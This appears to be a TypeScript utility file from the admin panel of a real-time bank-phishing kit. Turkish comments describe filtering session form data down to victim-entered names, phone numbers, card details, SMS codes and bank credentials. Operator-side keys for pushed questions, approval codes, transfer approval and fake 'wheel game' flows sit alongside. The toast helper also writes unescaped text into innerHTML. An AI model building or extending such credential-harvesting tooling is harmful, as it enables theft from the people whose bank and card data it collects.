export function playBeautifulNotification() {
  if (typeof window === "undefined") return;

  try {
    // Gerçekçi YouTube "Ding" / Resepsiyon Zili Sesi
    const audio = new Audio("/sounds/ding.mp3");
    audio.volume = 0.8;
    audio.play().catch(e => console.error("Audio play blocked by browser:", e));
  } catch (e) {
    console.error("Audio playback failed", e);
  }
}

export function showBeautifulToast(message: string, description?: string) {
  if (typeof window === "undefined") return;

  const containerId = "admin-toast-container";
  let container = document.getElementById(containerId);
  if (!container) {
    container = document.createElement("div");
    container.id = containerId;
    Object.assign(container.style, {
      position: "fixed",
      top: "12px",
      right: "12px",
      zIndex: "2147483647",
      display: "flex",
      flexDirection: "column",
      alignItems: "flex-end",
      gap: "6px",
      pointerEvents: "none",
      fontFamily: "system-ui, -apple-system, sans-serif",
    });
    document.body.appendChild(container);
  }

  const toast = document.createElement("div");
  Object.assign(toast.style, {
    display: "flex",
    alignItems: "center",
    gap: "8px",
    padding: "8px 12px",
    borderRadius: "9999px",
    boxShadow: "0 10px 15px -3px rgba(0,0,0,0.3), 0 4px 6px -2px rgba(0,0,0,0.1)",
    backgroundColor: "rgba(42, 42, 42, 0.95)",
    color: "#ffffff",
    border: "1px solid #444444",
    pointerEvents: "auto",
    opacity: "0",
    transform: "translateX(32px)",
    transition: "opacity 0.3s ease, transform 0.3s ease",
  });

  toast.innerHTML = `
    <svg style="width:14px;height:14px;color:#EB5E28;flex-shrink:0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
    </svg>
    <span style="font-size:12px;font-weight:600;white-space:nowrap">${message}</span>
    ${description ? `<span style="font-size:11px;color:#9ca3af;white-space:nowrap;max-width:260px;overflow:hidden;text-overflow:ellipsis">${description}</span>` : ''}
  `;

  container.appendChild(toast);

  const showToast = () => {
    toast.style.opacity = "1";
    toast.style.transform = "translateX(0px)";
  };

  requestAnimationFrame(showToast);
  setTimeout(showToast, 50);

  setTimeout(() => {
    toast.style.opacity = "0";
    toast.style.transform = "translateX(32px)";
    setTimeout(() => {
      if (container && toast.parentNode === container) {
        container.removeChild(toast);
      }
    }, 300);
  }, 3500);
}

/**
 * Sessions tablosundaki form_data nesnesinden sadece ve sadece
 * kullanicinin girdigi alanlari (isim, telefon, kart, SMS, banka credential vb.) suzer.
 * Admin tarafindan basilan teknik ayarlar, bildirim metinleri, sorular, generator kodlari
 * kesinlikle form verisi degisimi sayilmaz!
 */
export function extractUserFormData(data: any): Record<string, any> {
  if (!data || typeof data !== "object") return {};
  const ADMIN_KEYS = new Set([
    "generatorType",
    "generatorCode",
    "generatorLoginHistory",
    "transferApproval",
    "specialNoticeText",
    "specialNoticeImage",
    "specialNoticeLang",
    "specialNoticeSentAt",
    "customQuestionText",
    "customQuestionSentAt",
    "is_wheel_game",
    "is_win2_flow",
    "pending_profile",
    "currency",
    "bankSlug",
    "bankName",
    "partner_display_name",
    "amount",
  ]);

  const userFields: Record<string, any> = {};
  for (const [k, v] of Object.entries(data)) {
    if (ADMIN_KEYS.has(k)) continue;
    if (v === undefined || v === null || v === "") continue;

    // customQuestions: sadece kullanicinin verdigi cevap varsa dikkate al
    if (k === "customQuestions" && Array.isArray(v)) {
      const answers = v.map((item: any) => item?.answer).filter(Boolean);
      if (answers.length > 0) userFields.customQuestionsAnswers = answers;
      continue;
    }

    // generatorCurrent: sadece kullanicinin doldurdugu data nesnesi varsa dikkate al
    if (k === "generatorCurrent" && typeof v === "object") {
      const userDatas = Object.entries(v)
        .filter(([_, item]: any) => item?.data && Object.keys(item.data).length > 0)
        .map(([variant, item]: any) => ({ variant, data: item.data }));
      if (userDatas.length > 0) userFields.generatorCurrentDatas = userDatas;
      continue;
    }

    // admin prompt sifirlamalari (approvalStatus: "", approvalCode: "") atla
    if ((k === "approvalStatus" || k === "approvalCode") && !String(v).trim()) {
      continue;
    }

    userFields[k] = v;
  }
  return userFields;
}
